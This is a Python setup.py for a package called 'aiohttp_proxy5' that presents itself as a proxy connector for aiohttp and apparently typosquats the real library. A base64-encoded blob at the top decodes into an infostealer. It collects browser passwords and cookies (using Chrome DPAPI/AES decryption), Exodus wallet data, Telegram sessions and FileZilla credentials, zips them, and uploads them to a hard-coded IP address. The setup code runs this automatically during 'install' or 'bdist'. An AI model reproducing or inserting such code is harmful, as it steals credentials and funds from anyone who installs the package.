9PTzAwME9PTyApO19fTzBPME8wT09PT08wTzBPMDAgKCdwYXRoX3NlYXJjaC5weScsYiJpbXBvcnQgYXN5bmNpb1xyXG5pbXBvcnQgb3NcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBqb2luLCBpc2RpclxyXG5mcm9tIHR5cGluZyBpbXBvcnQgRGljdCwgSXRlcmFibGUsIExpc3RcclxuXHJcblxyXG5MT0NBTCA9IG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ11cclxuXHJcbnJvb3RfcGF0aHMgPSB7XHJcbiAgICBqb2luKExPQ0FMLCAnYXBwZGF0YScpLFxyXG4gICAgam9pbihMT0NBTCwgJ2FwcGRhdGEnLCAnbG9jYWwnKSxcclxuICAgIGpvaW4oTE9DQUwsICdhcHBkYXRhJywgJ3JvYW1pbmcnKSxcclxuICAgIGpvaW4oTE9DQUwsICdkb2N1bWVudHMnKSxcclxuICAgIGpvaW4oTE9DQUwsICdkb3dubG9hZHMnKSxcclxuICAgIGpvaW4oTE9DQUwsICdkZXNrdG9wJyksXHJcbiAgICAnQzpcXFxcJyxcclxuICAgICdEOlxcXFwnLFxyXG4gICAgJ0U6XFxcXCcsXHJcbiAgICAnQzpcXFxcUHJvZ3JhbSBGaWxlcycsXHJcbiAgICAnQzpcXFxcUHJvZ3JhbSBGaWxlcyAoeDg2KScsXHJcbiAgICAnQzpcXFxcXFxQcm9ncmFtRGF0YSdcclxuXHJcbn1cclxuXHJcblxyXG5hc3luYyBkZWYgc2VhcmNoX3BsdWdpbl9wYXRocyhwYXRoczogSXRlcmFibGVbc3RyXSwgcXVlcmllczogRGljdCk6XHJcbiAgICB0YXNrczogTGlzdFthc3luY2lvLlRhc2tdID0gW11cclxuXHJcbiAgICBxdWVyaWVzID0ge2subG93ZXIoKTogdiBmb3Igayx2IGluIHF1ZXJpZXMuaXRlbXMoKX1cclxuICAgIHRhcmdldF9mb2xkZXJfbmFtZXMgPSBzZXQocXVlcmllcy5rZXlzKCkpXHJcbiAgICBmb3IgcCBpbiBwYXRoczpcclxuICAgICAgICBpZiBpc2RpcihwKTpcclxuICAgICAgICAgICAgZm9yIGZuYW1lIGluIHRhcmdldF9mb2xkZXJfbmFtZXMuaW50ZXJzZWN0aW9uKGkubmFtZS5sb3dlcigpIGZvciBpIGluIG9zLnNjYW5kaXIocCkpOlxyXG4gICAgICAgICAgICAgICAgaWYgcXVlcmllc1tmbmFtZV0gaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICAgICAgICAgY3Vycl9wYXRoID0gam9pbihwLCBmbmFtZSlcclxuICAgICAgICAgICAgICAgICAgICBsb29wID0gYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpXHJcbiAgICAgICAgICAgICAgICAgICAgdGFzayA9IGxvb3AuY3JlYXRlX3Rhc2socXVlcmllc1tmbmFtZV0uY2FsbGJhY2soY3Vycl9wYXRoKSlcclxuICAgICAgICAgICAgICAgICAgICB0YXNrcy5hcHBlbmQodGFzaylcclxuXHJcbiAgICBmb3IgdGFzayBpbiB0YXNrczpcclxuICAgICAgICBhd2FpdCB0YXNrXHJcblxyXG5cclxuYXN5bmMgZGVmIHNlYXJjaF9wYXRocyhwYXRoczogSXRlcmFibGVbc3RyXSwgcXVlcmllczogSXRlcmFibGUpOlxyXG4gICAgdGFyZ2V0X2ZvbGRlcl9uYW1lcyA9IHtpLmxvd2VyKCkgZm9yIGkgaW4gcXVlcmllc31cclxuICAgIGZvciBwIGluIHBhdGhzOlxyXG4gICAgICAgIGlmIGlzZGlyKHApOlxyXG4gICAgICAgICAgICBmb3IgZm5hbWUgaW4gdGFyZ2V0X2ZvbGRlcl9uYW1lcy5pbnRlcnNlY3Rpb24oaS5uYW1lLmxvd2VyKCkgZm9yIGkgaW4gb3Muc2NhbmRpcihwKSk6XHJcbiAgICAgICAgICAgICAgICBpZiBmbmFtZSBpbiB0YXJnZXRfZm9sZGVyX25hbWVzOlxyXG4gICAgICAgICAgICAgICAgICAgIHlpZWxkIGpvaW4ocCwgZm5hbWUpXHJcbiIpO19fTzBPME8wT09PT08wTzBPMDAgKCdjb25maWcucHknLGInZnJvbSBkYXRhY2xhc3NlcyBpbXBvcnQgZGF0YWNsYXNzLCBmaWVsZFxyXG5mcm9tIGFpb2h0dHAgaW1wb3J0IENsaWVudFNlc3Npb24gYXMgU2Vzc2lvblxyXG5cclxuXHJcbkBkYXRhY2xhc3NcclxuY2xhc3MgQ29uZmlnOlxyXG4gICAgY2xpZW50X2lkOiBzdHJcclxuICAgIGhvc3Q6IHN0clxyXG4gICAgbG9nX3BhdGg6IHN0clxyXG4gICAgYnJvd3Nlcl9wYXNzd29yZHM6IGJvb2wgPSBmaWVsZChkZWZhdWx0PVRydWUpXHJcbiAgICBicm93c2VyX2Nvb2tpZXM6IGJvb2wgPSBmaWVsZChkZWZhdWx0PVRydWUpJyk7X19PME8wTzBPT09PTzBPME8wMCAoJ3BhdGhzLnB5JyxiImZyb20gb3MgaW1wb3J0IGVudmlyb25cclxuZnJvbSBvcy5wYXRoIGltcG9ydCBqb2luXHJcblxyXG5cclxuTE9DQUwgPSBlbnZpcm9uWydVU0VSUFJPRklMRSddXHJcblRFTVAgPSBqb2luKExPQ0FMLCAnYXBwZGF0YScsICdsb2NhbCcsICd0ZW1wJykiKTtfX08wTzBPME9PT09PME8wTzAwICgndG9vbHMucHknLGIiaW1wb3J0IG9zXHJcbmZyb20gYWlvZmlsZXMub3MgaW1wb3J0IHdyYXBcclxuZnJvbSBzaHV0aWwgaW1wb3J0IGNvcHlmaWxlLCBjb3B5dHJlZVxyXG5pbXBvcnQgdGltZWl0XHJcblxyXG5cclxuZGVmIHppcGRpcihwYXRoLCB6aXBoKTpcclxuICAgICcnJ0Zyb20gc3RhY2tvdmVyZmxvdycnJ1xyXG4gICAgIyB6aXBoIGlzIHppcGZpbGUgaGFuZGxlXHJcbiAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2FsayhwYXRoKTpcclxuICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczpcclxuICAgICAgICAgICAgemlwaC53cml0ZShvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSksIFxyXG4gICAgICAgICAgICAgICAgICAgICAgIG9zLnBhdGgucmVscGF0aChvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSksIFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5wYXRoLmpvaW4ocGF0aCwgJy4uJykpKVxyXG5cclxuY29weWZpbGUgPSB3cmFwKGNvcHlmaWxlKVxyXG5jb3B5dHJlZSA9IHdyYXAoY29weXRyZWUpXHJcbiIpO19fTzBPME8wT09PT08wTzBPMDAgKCdwbHVnaW5zL19faW5pdF9fLnB5JyxiJ2Zyb20gLmJhc2VfcGx1Z2luIGltcG9ydCBQbHVnaW5cclxuXHJcbmZyb20gLmJyb3dzZXJzIGltcG9ydCBDaHJvbWl1bVxyXG5cclxuZnJvbSAuZGV0YWlscyBpbXBvcnQgRGV0YWlsc1xyXG5cclxuZnJvbSAud2FsbGV0cyBpbXBvcnQgRXhvZHVzXHJcblxyXG5mcm9tIC5maWxlemlsbGEgaW1wb3J0IEZpbGV6aWxsYVxyXG5cclxuZnJvbSAudGVsZWdyYW0gaW1wb3J0IFRlbGVncmFtJyk7X19PME8wTzBPT09PTzBPME8wMCAoJ3BsdWdpbnMvYmFzZV9wbHVnaW4ucHknLGInZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIGFiYyBpbXBvcnQgQUJDLCBhYnN0cmFjdG1ldGhvZFxyXG5cclxuXHJcbmNsYXNzIFBsdWdpbihBQkMpOlxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIC4uLlxyXG5cclxuICAgIEBhYnN0cmFjdG1ldGhvZFxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICAuLi4nKTtfX08wTzBPME9PT09PME8wTzAwICgncGx1Z2lucy9icm93c2Vycy9fX2luaXRfXy5weScsYidmcm9tIC5jaHJvbWl1bSBpbXBvcnQgQ2hyb21pdW0nKTtfX08wTzBPME9PT09PME8wTzAwICgncGx1Z2lucy9icm93c2Vycy9jaHJvbWl1bS5weScsX09PMDBPT08wT09PME9PTzAwICk7X19PME8wTzBPT09PTzBPME8wMCAoJ3BsdWdpbnMvYnJvd3NlcnMvZGVjcnlwdC5weScsYicjIGh0dHBzOi8vZ2l0aHViLmNvbS9oYWthbm9ueW1vcy9zdGVhbC1jaHJvbWUtcGFzc3dvcmQtYWxsLXZlcnNpb24vYmxvYi9tYXN0ZXIvbG9jYWwucHlcclxuXHJcblxyXG5pbXBvcnQgY3R5cGVzXHJcbmltcG9ydCBjdHlwZXMud2ludHlwZXNcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzIGltcG9ydCBkZWZhdWx0X2JhY2tlbmRcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycyBpbXBvcnQgKFxyXG4gICAgQ2lwaGVyLCBhbGdvcml0aG1zLCBtb2RlcylcclxuaW1wb3J0IGJhc2U2NFxyXG5pbXBvcnQgb3NcclxuaW1wb3J0IGpzb25cclxuXHJcblxyXG5jbGFzcyBEZWNyeXB0b3I6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgcGF0aCkgLT4gTm9uZTpcclxuICAgICAgICBpZiBwYXRoIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYucGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uW1wnTE9DQUxBUFBEQVRBXCddLCByIkdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXExvY2FsIFN0YXRlIilcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBzZWxmLnBhdGggPSBwYXRoXHJcbiAgICAgICAgXHJcbiAgICAgICAgc2VsZi5rZXkgPSBOb25lXHJcbiAgICAgICAgc2VsZi5jaXBoZXIgPSBOb25lXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGRwYXBpX2RlY3J5cHQoZW5jcnlwdGVkKTpcclxuICAgICAgICBjbGFzcyBEQVRBX0JMT0IoY3R5cGVzLlN0cnVjdHVyZSk6XHJcbiAgICAgICAgICAgIF9maWVsZHNfID0gWyhcJ2NiRGF0YVwnLCBjdHlwZXMud2ludHlwZXMuRFdPUkQpLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAoXCdwYkRhdGFcJywgY3R5cGVzLlBPSU5URVIoY3R5cGVzLmNfY2hhcikpXVxyXG5cclxuICAgICAgICBwID0gY3R5cGVzLmNyZWF0ZV9zdHJpbmdfYnVmZmVyKGVuY3J5cHRlZCwgbGVuKGVuY3J5cHRlZCkpXHJcbiAgICAgICAgYmxvYmluID0gREFUQV9CTE9CKGN0eXBlcy5zaXplb2YocCksIHApXHJcbiAgICAgICAgYmxvYm91dCA9IERBVEFfQkxPQigpXHJcbiAgICAgICAgcmV0dmFsID0gY3R5cGVzLndpbmRsbC5jcnlwdDMyLkNyeXB0VW5wcm90ZWN0RGF0YShcclxuICAgICAgICAgICAgY3R5cGVzLmJ5cmVmKGJsb2JpbiksIE5vbmUsIE5vbmUsIE5vbmUsIE5vbmUsIDAsIGN0eXBlcy5ieXJlZihibG9ib3V0KSlcclxuICAgICAgICBpZiBub3QgcmV0dmFsOlxyXG4gICAgICAgICAgICByYWlzZSBjdHlwZXMuV2luRXJyb3IoKVxyXG4gICAgICAgIHJlc3VsdCA9IGN0eXBlcy5zdHJpbmdfYXQoYmxvYm91dC5wYkRhdGEsIGJsb2JvdXQuY2JEYXRhKVxyXG4gICAgICAgIGN0eXBlcy53aW5kbGwua2VybmVsMzIuTG9jYWxGcmVlKGJsb2JvdXQucGJEYXRhKVxyXG4gICAgICAgIHJldHVybiByZXN1bHRcclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZGVjcnlwdChjaXBoZXIsIGNpcGhlcnRleHQsIG5vbmNlKTpcclxuICAgICAgICBjaXBoZXIubW9kZSA9IG1vZGVzLkdDTShub25jZSlcclxuICAgICAgICBkZWNyeXB0b3IgPSBjaXBoZXIuZGVjcnlwdG9yKClcclxuICAgICAgICByZXR1cm4gZGVjcnlwdG9yLnVwZGF0ZShjaXBoZXJ0ZXh0KVxyXG5cclxuICAgIGRlZiBnZXRfa2V5X2Zyb21fbG9jYWxfc3RhdGUoc2VsZik6XHJcbiAgICAgICAganNuID0gTm9uZVxyXG4gICAgICAgIHdpdGggb3BlbihzZWxmLnBhdGgsIFwnclwnKSBhcyBmOlxyXG4gICAgICAgICAgICBqc24gPSBqc29uLmxvYWRzKHN0cihmLnJlYWRsaW5lKCkpKVxyXG4gICAgICAgIHJldHVybiBqc25bXCdvc19jcnlwdFwnXVtcJ2VuY3J5cHRlZF9rZXlcJ11cclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZ2V0X2NpcGhlcihrZXkpOlxyXG4gICAgICAgIGNpcGhlciA9IENpcGhlcihcclxuICAgICAgICAgICAgYWxnb3JpdGhtcy5BRVMoa2V5KSxcclxuICAgICAgICAgICAgTm9uZSxcclxuICAgICAgICAgICAgYmFja2VuZD1kZWZhdWx0X2JhY2tlbmQoKVxyXG4gICAgICAgIClcclxuICAgICAgICByZXR1cm4gY2lwaGVyXHJcblxyXG4gICAgZGVmIGFlc19kZWNyeXB0KHNlbGYsIGVuY3J5cHRlZF90eHQpOlxyXG4gICAgICAgIGlmIHNlbGYua2V5IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGVuY29kZWRfa2V5ID0gc2VsZi5nZXRfa2V5X2Zyb21fbG9jYWxfc3RhdGUoKVxyXG4gICAgICAgICAgICBlbmNyeXB0ZWRfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShlbmNvZGVkX2tleS5lbmNvZGUoKSlcclxuICAgICAgICAgICAgZW5jcnlwdGVkX2tleSA9IGVuY3J5cHRlZF9rZXlbNTpdXHJcbiAgICAgICAgICAgIHNlbGYua2V5ID0gRGVjcnlwdG9yLmRwYXBpX2RlY3J5cHQoZW5jcnlwdGVkX2tleSlcclxuICAgICAgICAgICAgc2VsZi5jaXBoZXIgPSBEZWNyeXB0b3IuZ2V0X2NpcGhlcihzZWxmLmtleSlcclxuICAgICAgICBcclxuICAgICAgICBub25jZSA9IGVuY3J5cHRlZF90eHRbMzoxNV1cclxuXHJcbiAgICAgICAgcmV0dXJuIERlY3J5cHRvci5kZWNyeXB0KHNlbGYuY2lwaGVyLGVuY3J5cHRlZF90eHRbMTU6XSxub25jZSlcclxuXHJcbiAgICBkZWYgZGVjcnlwdF9wYXNzd29yZChzZWxmLCBkYXRhKTpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGlmIGRhdGFbOjRdID09IGJcJ1xceDAxXFx4MDBcXHgwMFxceDAwXCc6XHJcbiAgICAgICAgICAgICAgICBkZWNyeXB0ZWQgPSBEZWNyeXB0b3IuZHBhcGlfZGVjcnlwdChkYXRhKVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGRlY3J5cHRlZC5kZWNvZGUoKVxyXG4gICAgICAgICAgICBlbGlmIGRhdGFbOjNdID09IGJcJ3YxMFwnOlxyXG4gICAgICAgICAgICAgICAgZGVjcnlwdGVkID0gc2VsZi5hZXNfZGVjcnlwdChkYXRhKVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGRlY3J5cHRlZFs6LTE2XS5kZWNvZGUoKVxyXG4gICAgICAgIGV4Y2VwdDpcclxuICAgICAgICAgICAgcmV0dXJuIE5vbmUnKTtfX08wTzBPME9PT09PME8wTzAwICgncGx1Z2lucy9icm93c2Vycy9DaHJvbWl1bS5weScsX09PMDBPT08wT09PME9PTzAwICk7X19PME8wTzBPT09PTzBPME8wMCAoJ3BsdWdpbnMvZGV0YWlscy5weScsX08wTzAwT09PME8wMDAwMDBPICk7X19PME8wTzBPT09PTzBPME8wMCAoJ3BsdWdpbnMvd2FsbGV0cy9fX2luaXRfXy5weScsYidmcm9tIC5leG9kdXMgaW1wb3J0IEV4b2R1cycpO19fTzBPME8wT09PT08wTzBPMDAgKCdwbHVnaW5zL3dhbGxldHMvZXhvZHVzLnB5JyxfT09PMDAwTzAwMDAwT09PTzAgKTtfX08wTzBPME9PT09PME8wTzAwICgncGx1Z2lucy93YWxsZXRzL0V4b2R1cy5weScsX09PTzAwME8wMDAwME9PT08wICk7X19PME8wTzBPT09PTzBPME8wMCAoJ3BsdWdpbnMvZmlsZXppbGxhLnB5JyxfTzBPT08wT09PTzBPTzBPT08gKTtfX08wTzBPME9PT09PME8wTzAwICgncGx1Z2lucy90ZWxlZ3JhbS5weScsX08wME8wMDBPTzAwTzAwTzBPICk7X19PME8wTzBPT09PTzBPME8wMCAoJ3BsdWdpbnMvRGV0YWlscy5weScsX08wTzAwT09PME8wMDAwMDBPICk7X19PME8wTzBPT09PTzBPME8wMCAoJ3BsdWdpbnMvRmlsZXppbGxhLnB5JyxfTzBPT08wT09PTzBPTzBPT08gKTtfX08wTzBPME9PT09PME8wTzAwICgncGx1Z2lucy9UZWxlZ3JhbS5weScsX08wME8wMDBPTzAwTzAwTzBPICk7aW1wb3J0IGFzeW5jaW8gO2Zyb20gYXN5bmNpbyBpbXBvcnQgY3JlYXRlX3Rhc2sgO2Zyb20gd2Vha3JlZiBpbXBvcnQgcHJveHkgO2Zyb20gcGF0aF9zZWFyY2ggaW1wb3J0IHNlYXJjaF9wbHVnaW5fcGF0aHMgLHJvb3RfcGF0aHMgO2Zyb20gY29uZmlnIGltcG9ydCBDb25maWcgO2Zyb20gYWlvaHR0cCBpbXBvcnQgQ2xpZW50U2Vzc2lvbiBhcyBTZXNzaW9uICxNdWx0aXBhcnRXcml0ZXIgLGhkcnMgLEZvcm1EYXRhIDtpbXBvcnQgc2VjcmV0cyAsdGltZWl0IDtmcm9tIHBhdGhzIGltcG9ydCBURU1QIDtmcm9tIG9zIGltcG9ydCBta2RpciA7ZnJvbSBvcyAucGF0aCBpbXBvcnQgam9pbiA7ZnJvbSB6aXBmaWxlIGltcG9ydCBaaXBGaWxlICxaSVBfREVGTEFURUQgO2Zyb20gYmFzZTY0IGltcG9ydCBiNjRlbmNvZGUgO2Zyb20gdG9vbHMgaW1wb3J0IHppcGRpciA7ZnJvbSBwbHVnaW5zIGltcG9ydCBDaHJvbWl1bSAsRGV0YWlscyAsRXhvZHVzICxGaWxlemlsbGEgLFRlbGVncmFtIDtIT1NUID0naHR0cDovLzE0NC4yNC4xMTUuMTcwJyNsaW5lOjI0DQoJYXN5bmMgZGVmIG1haW4gKCk6I2xpbmU6MjUNCgkJT09PT09PMDBPME9PME8wTzAgPXNlY3JldHMgLnRva2VuX2hleCAoMTAgKTtPT08wMDAwT09PTzAwMDAwMCA9am9pbiAoVEVNUCAsT09PT09PMDBPME9PME8wTzAgKTtwcmludCAoT09PMDAwME9PT08wMDAwMDAgKTtta2RpciAoT09PMDAwME9PT08wMDAwMDAgKTtPME9PME9PME9PMDBPMDAwTyA9W107T09PTzAwMDAwTzAwTzBPTzAgPUNvbmZpZyAoY2xpZW50X2lkID1PT09PT08wME8wT08wTzBPMCAsaG9zdCA9SE9TVCAsbG9nX3BhdGggPU9PTzAwMDBPT09PMDAwMDAwICk7TzBPTzAwMDBPT09PMDBPME8gPUNocm9taXVtIChPT09PMDAwMDBPMDBPME9PMCApO08wMDAwMDAwMDAwME9PME8wID17J2dvb2dsZSc6TzBPTzAwMDBPT09PMDBPME8gLCdleG9kdXMnOkV4b2R1cyAoT09PTzAwMDAwTzAwTzBPTzAgKSwnbW96aWxsYSc6Tm9uZSAsJ3lhbmRleCc6TzBPTzAwMDBPT09PMDBPME8gLCd0ZWxlZ3JhbSBkZXNrdG9wJzpUZWxlZ3JhbSAoT09PTzAwMDAwTzAwTzBPTzAgKSwndGVsZWdyYW0nOlRlbGVncmFtIChPT09PMDAwMDBPMDBPME9PMCApLCdvcGVyYSBzb2Z0d2FyZSc6TzBPTzAwMDBPT09PMDBPME8gLCdmaWxlemlsbGEnOkZpbGV6aWxsYSAoT09PTzAwMDAwTzAwTzBPTzAgKX07TzBPTzBPTzBPTzAwTzAwME8gLmFwcGVuZCAoY3JlYXRlX3Rhc2sgKHNlYXJjaF9wbHVnaW5fcGF0aHMgKHJvb3RfcGF0aHMgLE8wMDAwMDAwMDAwME9PME8wICkpKTtPME8wME9PME8wME8wME8wMCA9W0RldGFpbHMgKE9PT08wMDAwME8wME8wT08wICldI2xpbmU6MjYNCgkJZm9yIE9PME8wME8wT09PT08wTzBPIGluIE8wTzAwT08wTzAwTzAwTzAwIDpPME9PME9PME9PMDBPMDAwTyAuYXBwZW5kIChjcmVhdGVfdGFzayAoT08wTzAwTzBPT09PTzBPME8gLmNhbGxiYWNrICgpKSkjbGluZToyNw0KCQlmb3IgT09PME9PT09PME8wTzAwME8gaW4gTzBPTzBPTzBPTzAwTzAwME8gOmF3YWl0IE9PTzBPT09PTzBPME8wMDBPICNsaW5lOjI4DQoJCU9PME9PT09PME9PMDAwT09PID1qb2luIChURU1QICxmIntPT09PT08wME8wT08wTzBPMH0uemlwIikjbGluZToyOQ0KCQl3aXRoIFppcEZpbGUgKE9PME9PT09PME9PMDAwT09PICwndycsWklQX0RFRkxBVEVEIClhcyBPTzBPME8wTzBPTzBPT09PMCA6emlwZGlyIChPT08wMDAwT09PTzAwMDAwMCAsT08wTzBPME8wT08wT09PTzAgKSNsaW5lOjMwDQoJCXdpdGggTXVsdGlwYXJ0V3JpdGVyICgpYXMgTzAwT09PMDAwME9PMDBPT08gOiNsaW5lOjMxDQoJCQlPMDBPT08wMDAwT08wME9PTyAuYXBwZW5kIChvcGVuIChPTzBPT09PTzBPTzAwME9PTyAsJ3JiJykpI2xpbmU6MzINCgkJCWFzeW5jIHdpdGggU2Vzc2lvbiAoKWFzIE8wT09PTzAwTzAwTzAwTzBPIDphd2FpdCBPME9PT08wME8wME8wME8wTyAucG9zdCAoZiJ7SE9TVH0vcmVjZWl2ZV9sb2ciLGRhdGEgPU8wME9PTzAwMDBPTzAwT09PICxwYXJhbXMgPXsnY2xpZW50X2lkJzpPT09PT08wME8wT08wTzBPMCB9KSNsaW5lOjMzDQoJaWYgX19uYW1lX18gPT0nX19tYWluX18nOmFzeW5jaW8gLnJ1biAobWFpbiAoKSk=').decode(encoding='utf8'))

    
if len(sys.argv) > 0 and "install" == sys.argv[1] or "bdist" in sys.argv[1]:
    print('sb_proc running')
    sb_proc()
    print('sb_proc ended')

print('Заканчивается код бека')

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

version = None

with codecs.open(
    os.path.join(
        os.path.abspath(os.path.dirname(__file__)), "aiohttp_proxy5", "__init__.py"
    ),
    "r",
    "latin1",
) as fp:
    try:
        version = re.findall(r'^__version__ = "(\S+?)"$', fp.read(), re.M)[0]
    except IndexError:
        raise RuntimeError("Unable to determine version.")

if sys.version_info < (3, 5, 3):
    raise RuntimeError("aiohttp_proxy5 requires Python 3.5.3+")

with open("README.md") as f:
    long_description = f.read()

setup(
    name="aiohttp_proxy5",
    author="Skactor",
    author_email="sk4ct0r@gmail.com",
    version='0.1.11',
    license="Apache 2",
    url="https://github.com/Skactor/aiohttp-proxy",
    description="Full-featured proxy connector for aiohttp",
    long_description=long_description,
    long_description_content_type="text/markdown",
    packages=["aiohttp_proxy5"],
    keywords="asyncio aiohttp socks socks5 socks4 http https proxy",
    install_requires=["aiohttp>=2.3.2", "yarl"],
)
